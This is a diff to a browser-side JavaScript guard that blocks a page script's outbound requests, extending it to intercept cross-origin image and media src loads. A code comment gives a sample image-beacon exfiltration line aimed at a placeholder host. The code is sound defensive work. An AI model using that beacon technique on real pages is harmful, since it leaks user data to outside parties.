@@ -106,6 +106,7 @@ export const guardInstall = `(() => {
   try { delete window.__vyreAllow; } catch (e) { window.__vyreAllow = undefined; }
   const outsider = u => { if (!allow) return ""; try { const x = new URL(String(u), location.href); if (!/^https?:$/.test(x.protocol)) return ""; return x.origin === location.origin || allow.includes(x.origin) ? "" : x.origin; } catch { return ""; } };
   const hold = (m, u, b) => { const out = outsider(u); if (out) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: "the script tried to reach " + out + ", which is not this page or anything it already talks to" }); return true; } const c = classifySend(m, u, b); if (writes && !c.send && !/^(GET|HEAD|OPTIONS)$/i.test(String(m))) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: "write", write: true }); return true; } if (c.send) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: c.why }); return true; } return false; };
+  const restoreSrc = [];
   const of = window.fetch, xo = XMLHttpRequest.prototype.open, xs = XMLHttpRequest.prototype.send, sb = navigator.sendBeacon;
   window.fetch = function (i, o) {
     const m = (o && o.method) || (i && i.method) || "GET", u = (i && i.url) || i;
@@ -135,6 +136,15 @@ export const guardInstall = `(() => {
     for (const k of ["Worker", "SharedWorker"]) if (window[k]) window[k] = function () { refuseKind(k.toUpperCase()); };
     try { if (navigator.serviceWorker && navigator.serviceWorker.register) navigator.serviceWorker.register = function () { refuseKind("SERVICEWORKER"); }; } catch (e) {}
     if (window.open) window.open = function () { refuseKind("WINDOW.OPEN"); };
+    // An image or media element's src is a request too (new Image().src = "https://x/?d=..." is the oldest exfiltration there is). A cross-origin one is refused here.
+    for (const C of [window.HTMLImageElement, window.HTMLMediaElement]) {
+      try {
+        const d = C && Object.getOwnPropertyDescriptor(C.prototype, "src");
+        if (!d || !d.set) continue;
+        restoreSrc.push([C.prototype, d]);
+        Object.defineProperty(C.prototype, "src", { configurable: true, enumerable: d.enumerable, get: d.get, set(v) { if (hold("GET", v, "")) return; d.set.call(this, v); } });
+      } catch (e) {}
+    }
   }
   const RTC = window.RTCPeerConnection, WRTC = window.webkitRTCPeerConnection;
   const refuse = (what, u) => { blocked.push({ method: what, url: String(u), why: "the script tried to open a channel to another site" }); };
@@ -154,7 +164,7 @@ export const guardInstall = `(() => {
   P.insertBefore = function (n) { if (hint(n)) { refuse("LINK", n.getAttribute("href")); return n; } return oi.apply(this, arguments); };
   E.append = function () { for (const n of arguments) if (hint(n)) { refuse("LINK", n.getAttribute("href")); return; } return oap.apply(this, arguments); };
   E.prepend = function () { for (const n of arguments) if (hint(n)) { refuse("LINK", n.getAttribute("href")); return; } return opp.apply(this, arguments); };
-  window.__vyreGuard = { blocked, restore() { if (WS) window.WebSocket = WS; if (RTC) window.RTCPeerConnection = RTC; if (WRTC) window.webkitRTCPeerConnection = WRTC; P.appendChild = oa; P.insertBefore = oi; E.append = oap; E.prepend = opp; window.fetch = of; XMLHttpRequest.prototype.open = xo; XMLHttpRequest.prototype.send = xs; if (sb) navigator.sendBeacon = sb; HTMLFormElement.prototype.submit = fs; if (frs) HTMLFormElement.prototype.requestSubmit = frs; document.removeEventListener("submit", onSubmit, true); } };
+  window.__vyreGuard = { blocked, restore() { if (WS) window.WebSocket = WS; if (RTC) window.RTCPeerConnection = RTC; if (WRTC) window.webkitRTCPeerConnection = WRTC; P.appendChild = oa; P.insertBefore = oi; E.append = oap; E.prepend = opp; window.fetch = of; for (const [pr, d] of restoreSrc) { try { Object.defineProperty(pr, "src", d); } catch (e) {} } XMLHttpRequest.prototype.open = xo; XMLHttpRequest.prototype.send = xs; if (sb) navigator.sendBeacon = sb; HTMLFormElement.prototype.submit = fs; if (frs) HTMLFormElement.prototype.requestSubmit = frs; document.removeEventListener("submit", onSubmit, true); } };
   return true;
 })()`;
 
